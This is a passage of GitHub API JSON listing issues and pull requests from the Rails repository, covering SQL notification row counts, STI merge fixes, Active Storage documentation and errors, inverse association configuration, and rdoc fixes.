        "closed_at": "2024-01-26T14:01:34Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50888",
            "html_url": "https://github.com/rails/rails/pull/50888",
            "diff_url": "https://github.com/rails/rails/pull/50888.diff",
            "patch_url": "https://github.com/rails/rails/pull/50888.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because [REPLACE ME]\r\n\r\n### Detail\r\n\r\nThis Pull Request changes [REPLACE ME]\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50888/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50888/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50887",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50887/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50887/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50887/events",
        "html_url": "https://github.com/rails/rails/pull/50887",
        "id": 2102256404,
        "node_id": "PR_kwDNIULOZSlV8A",
        "number": 50887,
        "title": "Add row_count field to sql.active_record notification",
        "user": {
            "login": "marvin-bitterlich",
            "id": 644950,
            "node_id": "MDQ6VXNlcjY0NDk1MA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/644950?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/marvin-bitterlich",
            "html_url": "https://github.com/marvin-bitterlich",
            "followers_url": "https://api.github.com/users/marvin-bitterlich/followers",
            "following_url": "https://api.github.com/users/marvin-bitterlich/following{/other_user}",
            "gists_url": "https://api.github.com/users/marvin-bitterlich/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/marvin-bitterlich/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/marvin-bitterlich/subscriptions",
            "organizations_url": "https://api.github.com/users/marvin-bitterlich/orgs",
            "repos_url": "https://api.github.com/users/marvin-bitterlich/repos",
            "events_url": "https://api.github.com/users/marvin-bitterlich/events{/privacy}",
            "received_events_url": "https://api.github.com/users/marvin-bitterlich/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-26T13:55:17Z",
        "updated_at": "2024-01-31T13:51:21Z",
        "closed_at": "2024-01-29T18:02:16Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50887",
            "html_url": "https://github.com/rails/rails/pull/50887",
            "diff_url": "https://github.com/rails/rails/pull/50887.diff",
            "patch_url": "https://github.com/rails/rails/pull/50887.patch",
            "merged_at": "2024-01-29T18:02:16Z"
        },
        "body": "### Motivation / Background\r\n\r\nIn Intercom we are working on detecting queries with large result sets, as Vitess based databases (like in our case Planetscale) block queries that return more than (by default) 100k result set rows.\r\n\r\nWe have an internal patch for this that works well for us, but thought to contribute this upstream, so others can benefit\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `{*}Adapter.log`, which emits `sql.active_record` notifications.\r\n\r\nPreviously the instrument call only logs information that goes into a request, but allows the caller inside the block to modify the payload. We make use of this inside each adapter to add a new field to each `sql.active_record` notification with the number of result rows being returned in each query.\r\n\r\nThis allows consumers of this notification [(example)](https://github.com/DataDog/dd-trace-rb/blob/master/lib/datadog/tracing/contrib/active_record/events/sql.rb) to consume this metric. \r\n\r\nThere is previous work in this regard with the [`RecordFetchWarning`](https://github.com/rails/rails/blob/main/activerecord/lib/active_record/relation/record_fetch_warning.rb) module that can be included, which demonstrates the need to monitor queries with large result sets. In our case these log lines weren't easy to integrate into our observability stack, and having a numerical value attached to each sql trace allowed us to use the full power of our observability suite. \r\n\r\nThis pr also includes three tests in the instrumentation test suite that verify this working for model instanciation queries, direct value queries like `pluck` and raw `ActiveRecord::Base.connection.execute(sql)` queries.\r\n\r\n### Performance\r\n\r\nThe change asks the resultset how many elements it has. Expectation was that that should be a constant lookup, and benchmarks suggest this to be true:\r\n\r\nI have tested this change with `examples/performance` on adapters `sqlite3`, `mysql2` and `postgresql` with no measurable difference in performance (less than 0.1% when standard deviation was 1%).\r\n\r\n### Additional information\r\n\r\nI originally approached this inside `abstract_adapter` but it turns out every adapters Result uses a different method, so I moved the call into each adapters respective usage of `log` \r\n\r\n[`RecordFetchWarning`](https://github.com/rails/rails/blob/main/activerecord/lib/active_record/relation/record_fetch_warning.rb) works by patching `exec_queries`, so it aggregates the result set size of multiple queries into one, which is less helpful for this case, as the limits imposed by Vitess are per query. Additionally, this does not support the case of executing raw SQL on the connection, which is something that this patch captures.\r\n\r\nAs for the field name on the payload `row_count` seemed like a good name as it follows the same pattern as `result_count` does in https://guides.rubyonrails.org/active_support_instrumentation.html#instantiation-active-record\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50887/reactions",
            "total_count": 5,
            "+1": 3,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 2,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50887/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50886",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50886/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50886/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50886/events",
        "html_url": "https://github.com/rails/rails/pull/50886",
        "id": 2102255707,
        "node_id": "PR_kwDNIULOZSlTeQ",
        "number": 50886,
        "title": "[Fix #50812] Don't duplicate selects, inner and outer joins when merging with STI",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-26T13:54:50Z",
        "updated_at": "2024-02-21T20:43:08Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50886",
            "html_url": "https://github.com/rails/rails/pull/50886",
            "diff_url": "https://github.com/rails/rails/pull/50886.diff",
            "patch_url": "https://github.com/rails/rails/pull/50886.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes https://github.com/rails/rails/issues/50812\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `#merge_select_values`, `#merge_joins` and `#merge_outer_joins` in `ActiveRecord::Relation::Merger` to unionise selects, inner and outer joins when the two sources of a `merge` are related via STI.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nThe only similar case left in `ActiveRecord::Relation::Merger` is when [merging preloads](https://github.com/rails/rails/blob/68eade83c87ae309191add6dfa4959d7d7e07464/activerecord/lib/active_record/relation/merger.rb#L101).\r\n\r\nI don't think that is similar to these cases since the preload values are simply used to preload associations. I thought I would just mention it anyway.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50886/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50886/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50885",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50885/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50885/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50885/events",
        "html_url": "https://github.com/rails/rails/pull/50885",
        "id": 2102202900,
        "node_id": "PR_kwDNIULOZSiasw",
        "number": 50885,
        "title": "Document Attached::Model#attachment_changes [ci skip]",
        "user": {
            "login": "tsvallender",
            "id": 122306143,
            "node_id": "U_kgDOB0o-Xw",
            "avatar_url": "https://avatars.githubusercontent.com/u/122306143?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tsvallender",
            "html_url": "https://github.com/tsvallender",
            "followers_url": "https://api.github.com/users/tsvallender/followers",
            "following_url": "https://api.github.com/users/tsvallender/following{/other_user}",
            "gists_url": "https://api.github.com/users/tsvallender/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tsvallender/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tsvallender/subscriptions",
            "organizations_url": "https://api.github.com/users/tsvallender/orgs",
            "repos_url": "https://api.github.com/users/tsvallender/repos",
            "events_url": "https://api.github.com/users/tsvallender/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tsvallender/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-26T13:18:39Z",
        "updated_at": "2024-01-26T14:14:49Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50885",
            "html_url": "https://github.com/rails/rails/pull/50885",
            "diff_url": "https://github.com/rails/rails/pull/50885.diff",
            "patch_url": "https://github.com/rails/rails/pull/50885.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nAdds documentation for the `attachment_changes` method of Active Storage.\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50885/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50885/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50884",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50884/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50884/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50884/events",
        "html_url": "https://github.com/rails/rails/issues/50884",
        "id": 2101887489,
        "node_id": "I_kwDNIULOfUhCAQ",
        "number": 50884,
        "title": "`ReferenceError: File is not defined`",
        "user": {
            "login": "Annastacia-dev",
            "id": 109935450,
            "node_id": "U_kgDOBo17Wg",
            "avatar_url": "https://avatars.githubusercontent.com/u/109935450?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Annastacia-dev",
            "html_url": "https://github.com/Annastacia-dev",
            "followers_url": "https://api.github.com/users/Annastacia-dev/followers",
            "following_url": "https://api.github.com/users/Annastacia-dev/following{/other_user}",
            "gists_url": "https://api.github.com/users/Annastacia-dev/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Annastacia-dev/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Annastacia-dev/subscriptions",
            "organizations_url": "https://api.github.com/users/Annastacia-dev/orgs",
            "repos_url": "https://api.github.com/users/Annastacia-dev/repos",
            "events_url": "https://api.github.com/users/Annastacia-dev/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Annastacia-dev/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-26T09:34:22Z",
        "updated_at": "2024-01-26T18:41:01Z",
        "closed_at": "2024-01-26T18:41:01Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "I'm using the activestorage npm package in a NextJs app\r\nI have imported the DirectUpload component `import { DirectUpload } from 'activestorage';`\r\nError emerges when this code to upload the file is hit\r\n``` \r\nconst uploadFile = (file: RcFile) => {\r\n    const upload = new DirectUpload(\r\n      file,\r\n      `${api.defaults.baseURL}/rails/active_storage/direct_uploads`\r\n    );\r\n    upload.create((error: Error, blob: ActiveStorage.Blob) => {\r\n      if (error) {\r\n        console.error(error);\r\n      } else {\r\n        console.log(blob)\r\n      }\r\n    });\r\n  };\r\n```\r\n\r\nError stack:\r\n```\r\nImport trace for requested module:\r\n./node_modules/activestorage/app/assets/javascripts/activestorage.js\r\n./src/components/admin/forms/products/NewProduct.tsx\r\n  Compiled in 1015ms (3194 modules)\r\n  Fast Refresh had to perform a full reload due to a runtime error.\r\n  ReferenceError: File is not defined\r\n    at /home/annastacia/webcafe/dawatele/web/node_modules/activestorage/app/assets/javascripts/activestorage.js:438:19\r\n```\r\n\r\nI have used this before in a Vite + ReactJS app recently and I don't encounter the same error\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50884/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50884/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50883",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50883/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50883/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50883/events",
        "html_url": "https://github.com/rails/rails/pull/50883",
        "id": 2101864232,
        "node_id": "PR_kwDNIULOZSQNiA",
        "number": 50883,
        "title": "Put plural inverse association inference behind a configuration flag",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/83",
            "html_url": "https://github.com/rails/rails/milestone/83",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/83/labels",
            "id": 9964242,
            "node_id": "MI_kwDNIULOAJgK0g",
            "number": 83,
            "title": "7.2.0",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 7,
            "closed_issues": 11,
            "state": "open",
            "created_at": "2023-09-25T20:29:14Z",
            "updated_at": "2024-02-20T23:25:19Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 1,
        "created_at": "2024-01-26T09:19:56Z",
        "updated_at": "2024-01-26T17:23:32Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50883",
            "html_url": "https://github.com/rails/rails/pull/50883",
            "diff_url": "https://github.com/rails/rails/pull/50883.diff",
            "patch_url": "https://github.com/rails/rails/pull/50883.patch",
            "merged_at": null
        },
        "body": "Ref: https://github.com/rails/rails/pull/50284\r\n\r\nWhile having the inverse association configured it generally positive as it avoid some extra queries etc, infering it may break legecy code, as evidenced by how it broke `ActiveStorage::Blob` in https://github.com/rails/rails/pull/50800\r\n\r\nAs such we can't just enable this behavior immediately, we need to provide and upgrade path for users.\r\n\r\nAt this stage this PR is just a quick draft to discuss how exactly we should gate this. We can just make it a regular framework default, but perhaps emitting a deprecation warning when we would have infered the inverse relation would help users upgrade?  cc @rafaelfranca as you generally have great insights on this kind of new framework default.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50883/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50883/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50882",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50882/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50882/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50882/events",
        "html_url": "https://github.com/rails/rails/pull/50882",
        "id": 2101647087,
        "node_id": "PR_kwDNIULOZSEkjA",
        "number": 50882,
        "title": "Prevent rdoc task from excluding the main page",
        "user": {
            "login": "sato11",
            "id": 22004610,
            "node_id": "MDQ6VXNlcjIyMDA0NjEw",
            "avatar_url": "https://avatars.githubusercontent.com/u/22004610?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sato11",
            "html_url": "https://github.com/sato11",
            "followers_url": "https://api.github.com/users/sato11/followers",
            "following_url": "https://api.github.com/users/sato11/following{/other_user}",
            "gists_url": "https://api.github.com/users/sato11/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sato11/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sato11/subscriptions",
            "organizations_url": "https://api.github.com/users/sato11/orgs",
            "repos_url": "https://api.github.com/users/sato11/repos",
            "events_url": "https://api.github.com/users/sato11/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sato11/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-26T06:10:07Z",
        "updated_at": "2024-01-27T01:11:45Z",
        "closed_at": "2024-01-26T18:31:53Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50882",
            "html_url": "https://github.com/rails/rails/pull/50882",
            "diff_url": "https://github.com/rails/rails/pull/50882.diff",
            "patch_url": "https://github.com/rails/rails/pull/50882.patch",
            "merged_at": "2024-01-26T18:31:53Z"
        },
        "body": "### Motivation / Background\r\nThere was a bug where the main page becomes unable to be found and this change ensures that it does not happen.\r\n\r\nCloses https://github.com/rails/rails/issues/50871.\r\n\r\n### Checklist\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50882/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50882/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50881",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50881/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50881/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50881/events",
        "html_url": "https://github.com/rails/rails/pull/50881",
        "id": 2101555431,
        "node_id": "PR_kwDNIULOZR_1Rg",
        "number": 50881,
        "title": "Update caching_with_rails.md regarding extension in filename [ci skip]",
        "user": {
            "login": "D-system",
            "id": 853015,
            "node_id": "MDQ6VXNlcjg1MzAxNQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/853015?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/D-system",
            "html_url": "https://github.com/D-system",
            "followers_url": "https://api.github.com/users/D-system/followers",
            "following_url": "https://api.github.com/users/D-system/following{/other_user}",
            "gists_url": "https://api.github.com/users/D-system/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/D-system/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/D-system/subscriptions",
            "organizations_url": "https://api.github.com/users/D-system/orgs",
            "repos_url": "https://api.github.com/users/D-system/repos",
            "events_url": "https://api.github.com/users/D-system/events{/privacy}",
            "received_events_url": "https://api.github.com/users/D-system/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-26T03:51:09Z",
        "updated_at": "2024-01-30T09:18:35Z",
        "closed_at": "2024-01-30T09:17:39Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50881",
            "html_url": "https://github.com/rails/rails/pull/50881",
            "diff_url": "https://github.com/rails/rails/pull/50881.diff",
            "patch_url": "https://github.com/rails/rails/pull/50881.patch",
            "merged_at": "2024-01-30T09:17:39Z"
        },
